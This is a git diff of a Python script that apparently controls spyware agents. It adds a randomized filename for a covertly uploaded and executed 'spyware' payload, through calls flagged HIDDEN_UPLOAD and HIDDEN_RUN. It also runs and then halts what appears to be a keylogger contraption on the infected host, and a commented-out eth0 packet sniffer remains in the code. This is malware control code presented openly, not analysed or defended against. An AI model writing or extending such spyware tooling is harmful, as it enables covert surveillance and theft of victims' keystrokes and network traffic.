@@ -9,6 +9,7 @@ from structParams import *
 from agentRecruiter import AgentRecruiter
 import threading
 import configparser
+from random import randint
 from operation import Operation
 from icecream import ic
 
@@ -55,7 +56,7 @@ def main():
         manegerAgent.hidden_action_with_upload(
             FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
             "spyware",
-            "sentSpyware17.spy",
+            "sentSpyware" + str(randint(1, 1000)) + ".spy",
         )
     )
     while op.spyAgent is None:
@@ -67,6 +68,8 @@ def main():
     kligPar.kligP = kligPrams(40)
     kligP = ContParams(KligerType, kligPar)
     print(spyAgent.runContraption(kligP, 10))
+    sleep(20)
+    print(spyAgent.haltContraption(10))
     # sniffP = ContParams(SnifferType, Params(SniffParams(20, b"eth0")))
     # print(spyAgent.runContraption(sniffP, 10))
     # sleep(30)
